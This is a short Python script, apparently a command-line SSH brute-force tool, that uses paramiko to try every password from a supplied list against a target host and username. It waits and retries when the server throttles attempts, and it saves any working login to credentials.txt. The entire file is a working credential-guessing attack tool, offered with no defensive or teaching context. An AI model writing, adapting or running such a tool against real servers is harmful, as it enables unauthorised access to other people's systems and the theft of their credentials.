import paramiko
import socket
import time
from colorama import init, Fore
import argparse

init()

GREEN = Fore.GREEN
BLUE  = Fore.BLUE
RESET = Fore.RESET
RED = Fore.RED

def is_ssh_open(hostname, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        print(f"{RED}[+] Host: {hostname} is unreachable. Time out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"[-] Invalid credentials for {username}:{password}")
    except paramiko.SSHException:
        print(f"{BLUE} [*] Retrying with delay...{RESET}")
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        print(f"{GREEN} Found combo: \n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SSH Bruteforce.")
    parser.add_argument('host',help="Hostname or IP address of SSH Server.")
    parser.add_argument('-p','--passlist',help='Passwords file fore brute force.')
    parser.add_argument('-u','--user',help="Host username.")

    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user

    passlist = open(passlist).read().splitlines()
    for password in passlist:
        if is_ssh_open(host, user, password):
            open("credentials.txt","w").write(f"{user}@{host}:{password}")
            break
